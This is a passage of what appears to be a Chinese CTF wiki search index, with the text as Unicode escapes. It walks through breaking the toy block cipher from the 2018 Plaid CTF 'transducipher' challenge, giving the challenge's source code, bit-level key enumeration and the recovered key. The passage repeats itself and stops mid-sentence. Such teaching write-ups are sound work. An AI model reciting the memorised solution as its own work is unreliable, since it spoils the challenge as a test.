\uff1a\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u5f97\u4e24\u4e2a\u6216\u591a\u4e2a\u76f8\u5173\u5bc6\u94a5\u7684\u52a0\u5bc6\u6216\u89e3\u5bc6\u540e\u7684\u5bc6\u6587\u6216\u660e\u6587\u3002\u4f46\u662f\u653b\u51fb\u8005\u4e0d\u77e5\u9053\u8fd9\u4e9b\u5bc6\u94a5\u3002","title":"\u653b\u51fb\u6a21\u5f0f"},{"location":"crypto/attack_summary/attack-mode/#_3","text":"\u6839\u636e\u4e0d\u540c\u7684\u653b\u51fb\u6a21\u5f0f\uff0c\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u76ee\u524d\u5e38\u89c1\u7684\u653b\u51fb\u65b9\u6cd5\u4e3b\u8981\u6709 \u66b4\u529b\u653b\u51fb \u4e2d\u95f4\u76f8\u9047\u653b\u51fb \u7ebf\u6027\u5206\u6790 \u5dee\u5206\u5206\u6790 \u4e0d\u53ef\u80fd\u5dee\u5206\u5206\u6790 \u79ef\u5206\u5206\u6790 \u4ee3\u6570\u5206\u6790 \u76f8\u5173\u5bc6\u94a5\u653b\u51fb \u4fa7\u4fe1\u9053\u653b\u51fb","title":"\u5e38\u89c1\u653b\u51fb\u65b9\u6cd5"},{"location":"crypto/attack_summary/attack-mode/#_4","text":"https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%88%86%E6%9E%90","title":"\u53c2\u8003\u6587\u732e"},{"location":"crypto/attack_summary/bit-attack/","text":"\u6bd4\u7279\u653b\u51fb \u00b6 \u6982\u8ff0 \u00b6 \u7b80\u5355\u5730\u8bf4\uff0c\u5c31\u662f\u5229\u7528\u6bd4\u7279\u4f4d\u4e4b\u95f4\u7684\u5173\u7cfb\u8fdb\u884c\u653b\u51fb\u3002 2018 Plaid CTF tranducipher \u00b6 \u9898\u76ee\u5982\u4e0b #!/usr/bin/env python3.6 import os BLOCK_SIZE = 64 T = [ (( 2 , 1 ), 1 ), (( 5 , 0 ), 0 ), (( 3 , 4 ), 0 ), (( 1 , 5 ), 1 ), (( 0 , 3 ), 1 ), (( 4 , 2 ), 0 ), ] def block2bin ( b , length = BLOCK_SIZE ): return list ( map ( int , bin ( b )[ 2 :] . rjust ( length , '0' ))) def bin2block ( b ): return int ( \"\" . join ( map ( str , b )), 2 ) def transduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ]) def transduceblock ( b ): return bin2block ( transduce ( block2bin ( b ))) def swap ( b ): l = BLOCK_SIZE // 2 m = ( 1 << l ) - 1 return ( b >> l ) | (( b & m ) << l ) class Transducipher : def __init__ ( self , k ): self . k = [ k ] for i in range ( 1 , len ( T )): k = swap ( transduceblock ( k )) self . k . append ( k ) def encrypt ( self , b ): for i in range ( len ( T )): b ^= self . k [ i ] b = transduceblock ( b ) b = swap ( b ) return b if __name__ == \"__main__\" : flag = bytes . hex ( os . urandom ( BLOCK_SIZE // 8 )) k = int ( flag , 16 ) C = Transducipher ( k ) print ( \"Your flag is PCTF{ %s }\" % flag ) with open ( \"data1.txt\" , \"w\" ) as f : for i in range ( 16 ): pt = int ( bytes . hex ( os . urandom ( BLOCK_SIZE // 8 )), 16 ) ct = C . encrypt ( pt ) f . write ( str (( pt , ct )) + \" \\n \" ) \u9898\u76ee\u7ed9\u4e86 16 \u7ec4\u660e\u5bc6\u6587\u5bf9 \u660e\u6587\u5927\u5c0f 8 \u4e2a\u5b57\u8282 \u5bc6\u6587\u5927\u5c0f 8 \u4e2a\u5b57\u8282 \u5bc6\u94a5\u5927\u5c0f\u4e5f\u662f 8 \u4e2a\u5b57\u8282 \u6211\u4eec\u6240\u9700\u8981\u6c42\u89e3\u7684\u5c31\u662f\u5bc6\u94a5\u3002 \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u4e3b\u8981\u6709\u4e24\u79cd\u57fa\u672c\u64cd\u4f5c swap def swap ( b ): l = BLOCK_SIZE // 2 m = ( 1 << l ) - 1 return ( b >> l ) | (( b & m ) << l ) \u5c06\u7ed9\u5b9a\u7684\u6570\u636e\u7684\u9ad8 32 \u4f4d\u4e0e\u4f4e 32 \u4f4d\u4ea4\u6362\u3002 transduce T = [ (( 2 , 1 ), 1 ), (( 5 , 0 ), 0 ), (( 3 , 4 ), 0 ), (( 1 , 5 ), 1 ), (( 0 , 3 ), 1 ), (( 4 , 2 ), 0 ), ] def transduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ]) \u5176\u4e2d\uff0c b \u662f\u4e00\u4e2a 01 \u6570\u7ec4\uff0c\u521d\u59cb\u65f6\u523b\u5927\u5c0f\u4e3a 64\u3002 s \u662f\u4e00\u4e2a\u4e0b\u6807\u3002 \u57fa\u672c\u6d41\u7a0b\u5982\u4e0b \u6839\u636e s \u9009\u62e9\u4f7f\u7528 T \u7684\u54ea\u4e2a\u5143\u7d20\uff0c\u8fdb\u800c\u5c06\u5176\u5206\u4e3a d \u548c t\u3002 \u5c06 b \u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u53ea\u5305\u542b\u5934\u5143\u7d20\uff0c\u53e6\u4e00\u90e8\u5206\u5305\u542b\u5176\u5b83\u7684\u5143\u7d20\u3002 \u5c06\u5934\u5143\u7d20\u4e0e t \u5f02\u6216\u4f5c\u4e3a\u5f53\u524d\u7684\u5934\u5143\u7d20\uff0c\u7136\u540e\u7ee7\u7eed\u8f6c\u6362\u5269\u4e0b\u7684\u90e8\u5206\u3002 \u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u5c06\u8be5\u51fd\u6570\u8f6c\u6362\u4e3a\u8fed\u4ee3\u51fd\u6570 def transduce_iter ( b , s = 0 ): ans = [] for c in b : d , t = T [ s ] ans += [ c ^ t ] s = d [ c ] return ans \u8fdb\u800c\u7531\u4e8e\u6bcf\u6b21\u5904\u7406\u7684\u662f\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u5176\u5b9e\u8be5\u51fd\u6570\u662f\u53ef\u9006\u7684\uff0c\u5982\u4e0b def invtransduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ^ t ]) \u4e0b\u9762\u5206\u6790\u7a0b\u5e8f\u7684\u6838\u5fc3\u6d41\u7a0b\uff0c\u9996\u5148\u662f\u751f\u6210\u5bc6\u94a5\u90e8\u5206\uff0c\u8be5\u52a0\u5bc6\u7b97\u6cd5\u751f\u6210\u4e86 6 \u4e2a\u5bc6\u94a5\uff0c\u6bcf\u6b21\u751f\u6210\u7684\u65b9\u6cd5 transduce \u5148\u524d\u7684\u5bc6\u94a5\u5f97\u5230\u4e2d\u95f4\u503c t \u5bf9 t \u8fdb\u884c swap \u8fde\u7eed\u8fed\u4ee3 5 \u6b21 def __init__ ( self , k ): self . k = [ k ] for i in range ( 1 , len ( T )): k = swap ( transduceblock ( k )) self . k . append ( k ) \u52a0\u5bc6\u7b97\u6cd5\u5982\u4e0b\uff0c\u4e00\u5171\u8fed\u4ee3 6 \u8f6e\uff0c\u57fa\u672c\u6d41\u7a0b \u5f02\u6216\u5bc6\u94a5 transduce \u4ea4\u6362 def encrypt ( self , b ): for i in range ( len ( T )): b ^= self . k [ i ] b = transduceblock ( b ) b = swap ( b ) return b \u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u77e5\u8be5\u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u4e2a\u5757\u52a0\u5bc6\uff0c\u57fa\u672c\u4fe1\u606f\u5982\u4e0b \u5757\u5927\u5c0f\u4e3a 8 \u4e2a\u5b57\u8282 \u8f6e\u6570\u4e3a 6 \u8f6e \u52a0\u5bc6\u7b97\u6cd5\u7684\u6bcf\u8f6e\u7684\u57fa\u672c\u64cd\u4f5c\u4e3a trandcue \u548c swap\u3002 \u5bc6\u94a5\u7684\u6269\u5c55\u4e5f\u662f\u4e0e trandcue \u548c swap \u76f8\u5173\u3002 \u66f4\u5177\u4f53\u7684 swap \u662f\u5c06 8 \u5b57\u8282\u7684\u9ad8 32 \u4f4d\u4e0e\u4f4e 32 \u4f4d\u8fdb\u884c\u8c03\u6362\u3002 trandduce \u662f\u5bf9\u4e8e 8 \u5b57\u8282\u7684\u6bcf\u4e2a\u6bd4\u7279\uff0c\u9010\u6bd4\u7279\u4e0e\u67d0\u4e2a\u503c\u8fdb\u884c\u5f02\u6216\u3002\u8fd9\u4e2a\u503c\u4e0e T \u6709\u5173\u3002 \u901a\u8fc7\u8fdb\u4e00\u6b65\u5730\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e24\u4e2a\u51fd\u6570\u90fd\u662f\u53ef\u9006\u7684\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u6700\u540e\u7684\u5bc6\u6587\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u53ef\u4ee5\u5c06\u539f\u6765\u7684\u8f6e\u6570\u7f29\u77ed\u4e3a\u5dee\u4e0d\u591a 5 \u8f6e\uff0c\u56e0\u4e3a\u6700\u540e\u4e00\u8f6e\u7684 transduce \u548c swap \u6ca1\u6709\u4f5c\u7528\u4e86\u3002 \u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u5982\u4e0b\u53d8\u91cf \u540d\u5b57 \u542b\u4e49 k_{i,0} k_{i,0} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u7684\u9ad8 32 \u4f4d k_{i,1} k_{i,1} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u7684\u4f4e 32 \u4f4d d_{i,0} d_{i,0} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u8f93\u5165\u7684\u9ad8 32 \u4f4d d_{i,1} d_{i,1} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u8f93\u5165\u7684\u4f4e 32 \u4f4d \u7531\u4e8e\u5176\u4e2d\u6709\u4e00\u4e2a\u6838\u5fc3\u64cd\u4f5c\u662f swap\uff0c\u53ea\u4f1a\u64cd\u7eb5\u9ad8\u6216\u4f4e 32 \u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5206\u4e3a\u4e24\u90e8\u5206\u8003\u8651\u3002\u7b80\u5316\u5b9a\u4e49\u5982\u4e0b Transduce \u7b80\u5316\u4e3a T\uff0c\u8fd9\u91cc\u867d\u7136\u4e0e\u6e90\u4ee3\u7801\u91cc\u51b2\u7a81\uff0c\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u6682\u65f6\u7406\u89e3\u4e00\u4e0b\u3002 Swap \u7b80\u5316\u4e3a S\u3002 \u5219\u6bcf\u4e00\u8f6e\u7684\u660e\u5bc6\u6587\uff0c\u5bc6\u94a5\u5982\u4e0b \u8f6e\u6570 \u5de6\u4fa7\u5bc6\u94a5 \u5de6\u4fa7\u5bc6\u6587 \u53f3\u4fa7\u5bc6\u94a5 \u53f3\u4fa7\u5bc6\u6587 0 k_{0,0} k_{0,0} d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s) d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s) k_{0,1} k_{0,1} d_{1,1}=T(k_{0,0} \\oplus d_{0,0}) d_{1,1}=T(k_{0,0} \\oplus d_{0,0}) 1 k_{1,0}=T(k_{0,1},s) k_{1,0}=T(k_{0,1},s) d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s) d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s) k_{1,1}=T(k_{0,0}) k_{1,1}=T(k_{0,0}) d_{2,1}=T(k_{1,0} \\oplus d_{1,0}) d_{2,1}=T(k_{1,0} \\oplus d_{1,0}) 2 k_{2,0}=T(k_{1,1},s) k_{2,0}=T(k_{1,1},s) d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s) d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s) k_{2,1}=T(k_{1,0}) k_{2,1}=T(k_{1,0}) d_{3,1}=T(k_{2,0} \\oplus d_{2,0}) d_{3,1}=T(k_{2,0} \\oplus d_{2,0}) 3 k_{3,0}=T(k_{2,1},s) k_{3,0}=T(k_{2,1},s) d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s) d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s) k_{3,1}=T(k_{2,0}) k_{3,1}=T(k_{2,0}) d_{4,1}=T(k_{3,0} \\oplus d_{3,0}) d_{4,1}=T(k_{3,0} \\oplus d_{3,0}) 4 k_{4,0}=T(k_{3,1},s) k_{4,0}=T(k_{3,1},s) d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s) d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s) k_{4,1}=T(k_{3,0}) k_{4,1}=T(k_{3,0}) d_{5,1}=T(k_{4,0} \\oplus d_{4,0}) d_{5,1}=T(k_{4,0} \\oplus d_{4,0}) 5 k_{5,0}=T(k_{4,1},s) k_{5,0}=T(k_{4,1},s) d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s) d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s) k_{5,1}=T(k_{4,0}) k_{5,1}=T(k_{4,0}) d_{6,1}=T(k_{5,0} \\oplus d_{5,0}) d_{6,1}=T(k_{5,0} \\oplus d_{5,0}) \u90a3\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5\u9010\u6bd4\u7279\u4f4d\u679a\u4e3e k \u7684\u9ad8 32 \u4f4d\uff0c\u540c\u65f6\u679a\u4e3e\u5728\u8fdb\u884c T \u64cd\u4f5c\u65f6\u7684\u53ef\u80fd\u7684 s \u72b6\u6001\u4f4d\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u83b7\u53d6\u9ad8 32 \u4f4d\u5bc6\u94a5\u3002\u5728\u8fdb\u884c\u9010\u4f4d\u7206\u7834\u4e4b\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u4ece\u83b7\u53d6\u4e24\u4e2a\u53ef\u80fd\u7ed3\u679c [2659900894, 2659900895] \u518d\u6839\u636e\u5de6\u8fb9\u7684\u7ed3\u679c\uff0c\u53ef\u4ee5\u53bb\u83b7\u53d6\u53f3\u8fb9\u53ef\u80fd\u7684\u7ed3\u679c\uff0c\u5229\u7528 2659900894 \u83b7\u53d6\u7684\u53ef\u80fd\u7684\u7ed3\u679c\u5982\u4e0b # \u7b2c\u4e00\u7ec4\u660e\u5bc6\u6587\u5bf9\u5bf9\u5e94\u7684\u5bc6\u94a5\u53ef\u80fd\u592a\u591a\u3002 # \u7b2c\u4e8c\u7ec4\u4e00\u5171 6 \u4e2a\u3002 [2764038144, 2764038145, 2764038152, 2764038153, 2764038154, 2764038155] # \u7b2c\u4e09\u7ec4 [2764038144, 2764038145] \u7136\u540e\u5176\u5b9e\u6211\u4eec\u5c31\u53ef\u4ee5\u624b\u5de5\u8bd5\u4e00\u4e0b\u52a0\u5bc6\u6240\u6709\u7684\u660e\u5bc6\u6587\uff0c\u5982\u679c\u4e0d\u5bf9\uff0c\u5c31\u76f4\u63a5\u5224\u65ad\u9519\u8bef\u5373\u53ef\u4e86\u3002\u8fd9\u6837\u5176\u5b9e\u53ef\u4ee5\u5f88\u5feb\u53ef\u4ee5\u8fc7\u6ee4\u3002\u6700\u540e\u53ef\u4ee5\u53d1\u73b0\u5bc6\u94a5\u662f 2659900894|2764038145 \u4e5f\u5c31\u662f11424187353095200769\u3002\u4e5f\u5c31\u62ff\u5230\u4e86 flag\u3002 \u5f53\u7136\uff0c\u672c\u9898\u76ee\u4e5f\u53ef\u4ee5\u4f7f\u7528\u4e2d\u95f4\u76f8\u9047\u7684\u653b\u51fb\u65b9\u6cd5\uff0c\u4e5f\u5c31\u662f\u8bf4\u5206\u522b\u679a\u4e3e\u7b2c 0 \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u548c\u6700\u540e\u4e00\u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u4f7f\u5176\u5728\u7b2c\u4e09\u8f6e\u76f8\u9047\u4ea7\u751f\u78b0\u649e\u3002 \u53c2\u8003 \u00b6 http://blog.rb-tree.xyz/2018/05/07/plaidctf-2018-transducipher/","title":"\u6bd4\u7279\u653b\u51fb"},{"location":"crypto/attack_summary/bit-attack/#_1","text":"","title":"\u6bd4\u7279\u653b\u51fb"},{"location":"crypto/attack_summary/bit-attack/#_2","text":"\u7b80\u5355\u5730\u8bf4\uff0c\u5c31\u662f\u5229\u7528\u6bd4\u7279\u4f4d\u4e4b\u95f4\u7684\u5173\u7cfb\u8fdb\u884c\u653b\u51fb\u3002","title":"\u6982\u8ff0"},{"location":"crypto/attack_summary/bit-attack/#2018-plaid-ctf-tranducipher","text":"\u9898\u76ee\u5982\u4e0b #!/usr/bin/env python3.6 import os BLOCK_SIZE = 64 T = [ (( 2 , 1 ), 1 ), (( 5 , 0 ), 0 ), (( 3 , 4 ), 0 ), (( 1 , 5 ), 1 ), (( 0 , 3 ), 1 ), (( 4 , 2 ), 0 ), ] def block2bin ( b , length = BLOCK_SIZE ): return list ( map ( int , bin ( b )[ 2 :] . rjust ( length , '0' ))) def bin2block ( b ): return int ( \"\" . join ( map ( str , b )), 2 ) def transduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ]) def transduceblock ( b ): return bin2block ( transduce ( block2bin ( b ))) def swap ( b ): l = BLOCK_SIZE // 2 m = ( 1 << l ) - 1 return ( b >> l ) | (( b & m ) << l ) class Transducipher : def __init__ ( self , k ): self . k = [ k ] for i in range ( 1 , len ( T )): k = swap ( transduceblock ( k )) self . k . append ( k ) def encrypt ( self , b ): for i in range ( len ( T )): b ^= self . k [ i ] b = transduceblock ( b ) b = swap ( b ) return b if __name__ == \"__main__\" : flag = bytes . hex ( os . urandom ( BLOCK_SIZE // 8 )) k = int ( flag , 16 ) C = Transducipher ( k ) print ( \"Your flag is PCTF{ %s }\" % flag ) with open ( \"data1.txt\" , \"w\" ) as f : for i in range ( 16 ): pt = int ( bytes . hex ( os . urandom ( BLOCK_SIZE // 8 )), 16 ) ct = C . encrypt ( pt ) f . write ( str (( pt , ct )) + \" \\n \" ) \u9898\u76ee\u7ed9\u4e86 16 \u7ec4\u660e\u5bc6\u6587\u5bf9 \u660e\u6587\u5927\u5c0f 8 \u4e2a\u5b57\u8282 \u5bc6\u6587\u5927\u5c0f 8 \u4e2a\u5b57\u8282 \u5bc6\u94a5\u5927\u5c0f\u4e5f\u662f 8 \u4e2a\u5b57\u8282 \u6211\u4eec\u6240\u9700\u8981\u6c42\u89e3\u7684\u5c31\u662f\u5bc6\u94a5\u3002 \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u4e3b\u8981\u6709\u4e24\u79cd\u57fa\u672c\u64cd\u4f5c swap def swap ( b ): l = BLOCK_SIZE // 2 m = ( 1 << l ) - 1 return ( b >> l ) | (( b & m ) << l ) \u5c06\u7ed9\u5b9a\u7684\u6570\u636e\u7684\u9ad8 32 \u4f4d\u4e0e\u4f4e 32 \u4f4d\u4ea4\u6362\u3002 transduce T = [ (( 2 , 1 ), 1 ), (( 5 , 0 ), 0 ), (( 3 , 4 ), 0 ), (( 1 , 5 ), 1 ), (( 0 , 3 ), 1 ), (( 4 , 2 ), 0 ), ] def transduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ]) \u5176\u4e2d\uff0c b \u662f\u4e00\u4e2a 01 \u6570\u7ec4\uff0c\u521d\u59cb\u65f6\u523b\u5927\u5c0f\u4e3a 64\u3002 s \u662f\u4e00\u4e2a\u4e0b\u6807\u3002 \u57fa\u672c\u6d41\u7a0b\u5982\u4e0b \u6839\u636e s \u9009\u62e9\u4f7f\u7528 T \u7684\u54ea\u4e2a\u5143\u7d20\uff0c\u8fdb\u800c\u5c06\u5176\u5206\u4e3a d \u548c t\u3002 \u5c06 b \u5206\u4e3a\u4e24\u90e8\u5206\uff0c\u4e00\u90e8\u5206\u53ea\u5305\u542b\u5934\u5143\u7d20\uff0c\u53e6\u4e00\u90e8\u5206\u5305\u542b\u5176\u5b83\u7684\u5143\u7d20\u3002 \u5c06\u5934\u5143\u7d20\u4e0e t \u5f02\u6216\u4f5c\u4e3a\u5f53\u524d\u7684\u5934\u5143\u7d20\uff0c\u7136\u540e\u7ee7\u7eed\u8f6c\u6362\u5269\u4e0b\u7684\u90e8\u5206\u3002 \u5176\u5b9e\u6211\u4eec\u53ef\u4ee5\u5c06\u8be5\u51fd\u6570\u8f6c\u6362\u4e3a\u8fed\u4ee3\u51fd\u6570 def transduce_iter ( b , s = 0 ): ans = [] for c in b : d , t = T [ s ] ans += [ c ^ t ] s = d [ c ] return ans \u8fdb\u800c\u7531\u4e8e\u6bcf\u6b21\u5904\u7406\u7684\u662f\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u5176\u5b9e\u8be5\u51fd\u6570\u662f\u53ef\u9006\u7684\uff0c\u5982\u4e0b def invtransduce ( b , s = 0 ): if len ( b ) == 0 : return b d , t = T [ s ] b0 , bp = b [ 0 ], b [ 1 :] return [ b0 ^ t ] + transduce ( bp , s = d [ b0 ^ t ]) \u4e0b\u9762\u5206\u6790\u7a0b\u5e8f\u7684\u6838\u5fc3\u6d41\u7a0b\uff0c\u9996\u5148\u662f\u751f\u6210\u5bc6\u94a5\u90e8\u5206\uff0c\u8be5\u52a0\u5bc6\u7b97\u6cd5\u751f\u6210\u4e86 6 \u4e2a\u5bc6\u94a5\uff0c\u6bcf\u6b21\u751f\u6210\u7684\u65b9\u6cd5 transduce \u5148\u524d\u7684\u5bc6\u94a5\u5f97\u5230\u4e2d\u95f4\u503c t \u5bf9 t \u8fdb\u884c swap \u8fde\u7eed\u8fed\u4ee3 5 \u6b21 def __init__ ( self , k ): self . k = [ k ] for i in range ( 1 , len ( T )): k = swap ( transduceblock ( k )) self . k . append ( k ) \u52a0\u5bc6\u7b97\u6cd5\u5982\u4e0b\uff0c\u4e00\u5171\u8fed\u4ee3 6 \u8f6e\uff0c\u57fa\u672c\u6d41\u7a0b \u5f02\u6216\u5bc6\u94a5 transduce \u4ea4\u6362 def encrypt ( self , b ): for i in range ( len ( T )): b ^= self . k [ i ] b = transduceblock ( b ) b = swap ( b ) return b \u901a\u8fc7\u5206\u6790\u7a0b\u5e8f\uff0c\u53ef\u77e5\u8be5\u52a0\u5bc6\u7b97\u6cd5\u662f\u4e00\u4e2a\u5757\u52a0\u5bc6\uff0c\u57fa\u672c\u4fe1\u606f\u5982\u4e0b \u5757\u5927\u5c0f\u4e3a 8 \u4e2a\u5b57\u8282 \u8f6e\u6570\u4e3a 6 \u8f6e \u52a0\u5bc6\u7b97\u6cd5\u7684\u6bcf\u8f6e\u7684\u57fa\u672c\u64cd\u4f5c\u4e3a trandcue \u548c swap\u3002 \u5bc6\u94a5\u7684\u6269\u5c55\u4e5f\u662f\u4e0e trandcue \u548c swap \u76f8\u5173\u3002 \u66f4\u5177\u4f53\u7684 swap \u662f\u5c06 8 \u5b57\u8282\u7684\u9ad8 32 \u4f4d\u4e0e\u4f4e 32 \u4f4d\u8fdb\u884c\u8c03\u6362\u3002 trandduce \u662f\u5bf9\u4e8e 8 \u5b57\u8282\u7684\u6bcf\u4e2a\u6bd4\u7279\uff0c\u9010\u6bd4\u7279\u4e0e\u67d0\u4e2a\u503c\u8fdb\u884c\u5f02\u6216\u3002\u8fd9\u4e2a\u503c\u4e0e T \u6709\u5173\u3002 \u901a\u8fc7\u8fdb\u4e00\u6b65\u5730\u5206\u6790\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u8fd9\u4e24\u4e2a\u51fd\u6570\u90fd\u662f\u53ef\u9006\u7684\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u6700\u540e\u7684\u5bc6\u6587\uff0c\u90a3\u4e48\u6211\u4eec\u5176\u5b9e\u53ef\u4ee5\u5c06\u539f\u6765\u7684\u8f6e\u6570\u7f29\u77ed\u4e3a\u5dee\u4e0d\u591a 5 \u8f6e\uff0c\u56e0\u4e3a\u6700\u540e\u4e00\u8f6e\u7684 transduce \u548c swap \u6ca1\u6709\u4f5c\u7528\u4e86\u3002 \u6211\u4eec\u53ef\u4ee5\u5b9a\u4e49\u5982\u4e0b\u53d8\u91cf \u540d\u5b57 \u542b\u4e49 k_{i,0} k_{i,0} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u7684\u9ad8 32 \u4f4d k_{i,1} k_{i,1} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u5bc6\u94a5\u7684\u4f4e 32 \u4f4d d_{i,0} d_{i,0} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u8f93\u5165\u7684\u9ad8 32 \u4f4d d_{i,1} d_{i,1} \u7b2c i \u8f6e\u4f7f\u7528\u7684\u8f93\u5165\u7684\u4f4e 32 \u4f4d \u7531\u4e8e\u5176\u4e2d\u6709\u4e00\u4e2a\u6838\u5fc3\u64cd\u4f5c\u662f swap\uff0c\u53ea\u4f1a\u64cd\u7eb5\u9ad8\u6216\u4f4e 32 \u4f4d\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5206\u4e3a\u4e24\u90e8\u5206\u8003\u8651\u3002\u7b80\u5316\u5b9a\u4e49\u5982\u4e0b Transduce \u7b80\u5316\u4e3a T\uff0c\u8fd9\u91cc\u867d\u7136\u4e0e\u6e90\u4ee3\u7801\u91cc\u51b2\u7a81\uff0c\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u6682\u65f6\u7406\u89e3\u4e00\u4e0b\u3002 Swap \u7b80\u5316\u4e3a S\u3002 \u5219\u6bcf\u4e00\u8f6e\u7684\u660e\u5bc6\u6587\uff0c\u5bc6\u94a5\u5982\u4e0b \u8f6e\u6570 \u5de6\u4fa7\u5bc6\u94a5 \u5de6\u4fa7\u5bc6\u6587 \u53f3\u4fa7\u5bc6\u94a5 \u53f3\u4fa7\u5bc6\u6587 0 k_{0,0} k_{0,0} d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s) d_{1,0}=T(k_{0,1} \\oplus d_{0,1} ,s) k_{0,1} k_{0,1} d_{1,1}=T(k_{0,0} \\oplus d_{0,0}) d_{1,1}=T(k_{0,0} \\oplus d_{0,0}) 1 k_{1,0}=T(k_{0,1},s) k_{1,0}=T(k_{0,1},s) d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s) d_{2,0}=T(k_{1,1} \\oplus d_{1,1} ,s) k_{1,1}=T(k_{0,0}) k_{1,1}=T(k_{0,0}) d_{2,1}=T(k_{1,0} \\oplus d_{1,0}) d_{2,1}=T(k_{1,0} \\oplus d_{1,0}) 2 k_{2,0}=T(k_{1,1},s) k_{2,0}=T(k_{1,1},s) d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s) d_{3,0}=T(k_{2,1} \\oplus d_{2,1} ,s) k_{2,1}=T(k_{1,0}) k_{2,1}=T(k_{1,0}) d_{3,1}=T(k_{2,0} \\oplus d_{2,0}) d_{3,1}=T(k_{2,0} \\oplus d_{2,0}) 3 k_{3,0}=T(k_{2,1},s) k_{3,0}=T(k_{2,1},s) d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s) d_{4,0}=T(k_{3,1} \\oplus d_{3,1} ,s) k_{3,1}=T(k_{2,0}) k_{3,1}=T(k_{2,0}) d_{4,1}=T(k_{3,0} \\oplus d_{3,0}) d_{4,1}=T(k_{3,0} \\oplus d_{3,0}) 4 k_{4,0}=T(k_{3,1},s) k_{4,0}=T(k_{3,1},s) d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s) d_{5,0}=T(k_{4,1} \\oplus d_{4,1} ,s) k_{4,1}=T(k_{3,0}) k_{4,1}=T(k_{3,0}) d_{5,1}=T(k_{4,0} \\oplus d_{4,0}) d_{5,1}=T(k_{4,0} \\oplus d_{4,0}) 5 k_{5,0}=T(k_{4,1},s) k_{5,0}=T(k_{4,1},s) d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s) d_{6,0}=T(k_{5,1} \\oplus d_{5,1} ,s) k_{5,1}=T(k_{4,0}) k_{5,1}=T(k_{4,0}) d_{6,1}=T(k_{5,0} \\oplus d_{5,0}) d_{6,1}=T(k_{5,0} \\oplus d_{5,0}) \u90a3\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5\u9010\u6bd4\u7279\u4f4d\u679a\u4e3e k \u7684\u9ad8 32 \u4f4d\uff0c\u540c\u65f6\u679a\u4e3e\u5728\u8fdb\u884c T \u64cd\u4f5c\u65f6\u7684\u53ef\u80fd\u7684 s \u72b6\u6001\u4f4d\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u83b7\u53d6\u9ad8 32 